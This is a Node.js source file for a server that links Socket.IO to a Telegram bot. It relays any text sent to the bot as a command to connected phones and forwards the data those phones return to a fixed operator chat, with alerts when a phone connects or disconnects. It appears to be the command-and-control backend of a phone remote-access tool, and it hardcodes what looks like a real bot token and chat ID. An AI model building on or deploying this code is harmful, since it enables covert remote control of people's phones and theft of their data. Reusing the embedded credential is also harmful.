const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const { Telegraf } = require('telegraf');

const app = express();
const server = http.createServer(app);

// --- CONFIGURATION ---
const BOT_TOKEN = '8746887497:AAHNMQ2RAMI_iu9-KUVoKum72zZIsUhh00E';
const MY_CHAT_ID = '7066124462'; 
const bot = new Telegraf(BOT_TOKEN);

const io = new Server(server, {
    cors: { origin: "*" },
    allowEIO3: true 
});

// --- TELEGRAM LOGIC ---
bot.on('text', (ctx) => {
    const command = ctx.message.text;
    
    if (command === '/start') {
        return ctx.reply('Welcome! Send any command to the phone.');
    }

    // Command phone ko bhejien
    io.emit('phone_command', command);
    ctx.reply(`[>] Command Sent: ${command}`);
});

// Bot error handling (Taaki bot crash na ho)
bot.catch((err) => {
    console.error('Telegraf error', err);
});

bot.launch();

// --- SOCKET LOGIC ---
app.get('/', (req, res) => res.send('Server & Bot are Live!'));

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);
    
    // Connection alert
    bot.telegram.sendMessage(MY_CHAT_ID, `📱 Phone Connected!\nID: ${socket.id}`).catch(err => console.log(err));

    socket.on('phone_data', (data) => {
        console.log('Data from Phone:', data);
        
        // FIX: Humne parse_mode hata diya hai taaki symbols ki wajah se crash na ho
        const message = `⚠️ DATA RECEIVED ⚠️\n\n${JSON.stringify(data, null, 2)}`;
        
        bot.telegram.sendMessage(MY_CHAT_ID, message).catch((err) => {
            console.log("Telegram Send Error:", err.description);
            // Agar formatting ke saath fail ho, toh simple bhej do
            bot.telegram.sendMessage(MY_CHAT_ID, "Data error, check logs.");
        });
        
        io.emit('termux_receive', data);
    });

    socket.on('disconnect', () => {
        bot.telegram.sendMessage(MY_CHAT_ID, '❌ Phone Disconnected.').catch(err => console.log(err));
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
    
